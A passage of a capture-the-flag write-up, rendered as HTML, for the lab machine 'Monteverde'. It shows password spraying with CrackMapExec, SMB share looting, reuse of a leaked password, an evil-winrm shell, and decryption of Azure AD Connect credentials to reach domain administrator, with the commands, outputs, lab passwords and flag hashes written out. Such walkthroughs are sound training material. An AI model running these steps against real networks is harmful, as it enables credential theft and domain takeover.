-dc-ip 10.10.10.172 MEGABANK/smorgan</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-&gt; nothing</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Thanks to <a href="https://github.com/CiscoCXSecurity/enum4linux" target="_blank" rel="noopener noreferrer">enum4linux</a>, we now have all users and groups information we need.</p><p>Let&#x27;s try a quick bruteforce where user = password with <a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener noreferrer">CrackMapExec</a>.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cme smb 10.10.10.172 -u users.txt -p users.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK\SABatchJobs:SABatchJobs</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="network-reconnaissance">Network reconnaissance<a href="#network-reconnaissance" class="hash-link" aria-label="Direct link to Network reconnaissance" title="Direct link to Network reconnaissance">â€‹</a></h3><p>We found the password <code>SABatchJobs</code> use the username as password.
Let&#x27;s use this account for enumerating some shares:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cme smb 10.10.10.172 -u SABatchJobs -p SABatchJobs --shares</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK) (signing:True) (SMBv1:False)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK\SABatchJobs:SABatchJobs</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SMB         10.10.10.172    445    MONTEVERDE       [+] Enumerated shares</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SMB         10.10.10.172    445    MONTEVERDE       Share           Permissions     Remark</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SMB         10.10.10.172    445    MONTEVERDE       -----           -----------     ------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SMB         10.10.10.172    445    MONTEVERDE       ADMIN$                          Remote Admin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SMB         10.10.10.172    445    MONTEVERDE       azure_uploads   READ</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SMB         10.10.10.172    445    MONTEVERDE       C$                              Default share</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SMB         10.10.10.172    445    MONTEVERDE       E$                              Default share</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SMB         10.10.10.172    445    MONTEVERDE       IPC$            READ            Remote IPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SMB         10.10.10.172    445    MONTEVERDE       NETLOGON        READ            Logon server share</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SMB         10.10.10.172    445    MONTEVERDE       SYSVOL          READ            Logon server share</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SMB         10.10.10.172    445    MONTEVERDE       users$          READ</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s find is there are valuable files in <code>users$</code> share.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ smbclient &#x27;\\10.10.10.172\users$&#x27; -U &#x27;SABatchJobs&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Unable to initialize messaging context</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Enter WORKGROUP\SABatchJobs&#x27;s password:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Try &quot;help&quot; to get a list of possible commands.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">smb: \&gt; recuse on</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">recuse: command not found</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">smb: \&gt; recurse on</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">smb: \&gt; prompt off</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">smb: \&gt; mget *</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">getting file \mhope\azure.xml of size 1212 as azure.xml (4,8 KiloBytes/sec) (average 4,8 KiloBytes/sec)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s read <code>/mhope/azure.xml</code>:</p><div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">Objs</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">Version</span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">1.1.0.1</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">xmlns</span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">http://schemas.microsoft.com/powershell/2004/04</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">Obj</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">RefId</span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">0</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">TN</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">RefId</span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">0</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">T</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain">Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;/</span><span class="token tag" style="color:rgb(255, 121, 198)">T</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">T</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain">System.Object</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;/</span><span class="token tag" style="color:rgb(255, 121, 198)">T</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;/</span><span class="token tag" style="color:rgb(255, 121, 198)">TN</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">ToString</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain">Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;/</span><span class="token tag" style="color:rgb(255, 121, 198)">ToString</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">Props</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">DT</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">N</span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">StartDate</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain">2020-01-03T05:35:00.7562298-08:00</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;/</span><span class="token tag" style="color:rgb(255, 121, 198)">DT</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">DT</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">N</span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">EndDate</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain">2054-01-03T05:35:00.7562298-08:00</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;/</span><span class="token tag" style="color:rgb(255, 121, 198)">DT</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">G</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">N</span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">KeyId</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain">00000000-0000-0000-0000-000000000000</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;/</span><span class="token tag" style="color:rgb(255, 121, 198)">G</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">S</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">N</span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">Password</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain">4n0therD4y@n0th3r$</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;/</span><span class="token tag" style="color:rgb(255, 121, 198)">S</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;/</span><span class="token tag" style="color:rgb(255, 121, 198)">Props</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;/</span><span class="token tag" style="color:rgb(255, 121, 198)">Obj</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;/</span><span class="token tag" style="color:rgb(255, 121, 198)">Objs</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>It seems a password is leaked, let&#x27;s try credential stuffing: maybe we can
re-use one of the accounts.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cme smb 10.10.10.172 -u ../users.txt -p &#x27;4n0therD4y@n0th3r$&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK) (signing:True) (SMBv1:False)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK\mhope:4n0therD4y@n0th3r$</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Cool <code>mhope</code> is using this password too.</p><p>As winRM port is open, we can authenticate and gain shell access with
<a href="https://github.com/Hackplayers/evil-winrm" target="_blank" rel="noopener noreferrer">evil-winrm</a>.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ evil-winrm -i 10.10.10.172 -u &#x27;mhope&#x27; -p &#x27;4n0therD4y@n0th3r$&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Evil-WinRM shell v2.3</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Info: Establishing connection to remote endpoint</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\mhope\Documents&gt; gc ../Desktop/user.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">4961976bd7d8f4eeb2ce3705e2f212f2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="privilege-escalation--mhope-to-administrator">Privilege Escalation : mhope to Administrator<a href="#privilege-escalation--mhope-to-administrator" class="hash-link" aria-label="Direct link to Privilege Escalation : mhope to Administrator" title="Direct link to Privilege Escalation : mhope to Administrator">â€‹</a></h3><p>Then there is a hidden folder:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\mhope\.Azure&gt; dir -Force</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    Directory: C:\Users\mhope\.Azure</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Mode                LastWriteTime         Length Name</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">----                -------------         ------ ----</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">d-----         1/3/2020   5:35 AM                ErrorRecords</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-a----         1/3/2020   5:31 AM             34 AzurePSDataCollectionProfile.json</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-a----         1/3/2020   5:35 AM           2794 AzureRmContext.json</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-a----         1/3/2020   5:31 AM            191 AzureRmContextSettings.json</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-a----         1/3/2020   5:36 AM           7896 TokenCache.dat</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We have azure powershell already loaded <a href="https://github.com/Azure/azure-powershell" target="_blank" rel="noopener noreferrer">https://github.com/Azure/azure-powershell</a></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\mhope\.Azure&gt; Get-AzContext</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Name                                     Account                                              SubscriptionName                                    Environment                                         TenantId</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">----                                     -------                                              ----------------                                    -----------                                         --------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">372efea9-7bc4-4b76-8839-984b45edfb98 ... john@a67632354763outlook.onmicrosoft.com                                                                 AzureCloud                                          372efea9-7bc4-4b76-8839-984b45edfb98</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>There is great resources and tools about exploiting <em>Azure AD Connect</em>.</p><ul><li><a href="https://vbscrub.video.blog/2020/01/14/azure-ad-connect-database-exploit-priv-esc/" target="_blank" rel="noopener noreferrer">Azure AD Connect Database Exploit (Priv Esc)</a></li><li><a href="https://github.com/fox-it/adconnectdump" target="_blank" rel="noopener noreferrer">Azure AD Connect password extraction</a></li></ul><p>You can fidn a pre-compiled version of <code>AdSyncDecrypt</code> <a href="https://github.com/VbScrub/AdSyncDecrypt/releases" target="_blank" rel="noopener noreferrer">here</a>.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">C:/Users/mhope/.Azure/AdDecrypt.exe -FullSQL</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">======================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">AZURE AD SYNC CREDENTIAL DECRYPTION TOOL</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Based on original code from: https://github.com/fox-it/adconnectdump</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">======================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Opening database connection...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Executing SQL commands...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Closing database connection...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Decrypting XML...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Parsing XML...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Finished!</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">DECRYPTED CREDENTIALS:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Username: administrator</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Password: d0m@in4dminyeah!</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Domain: MEGABANK.LOCAL</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; gc ../Desktop/root.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">12909612d25c8dcf6e5a07d1a804a0bc</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 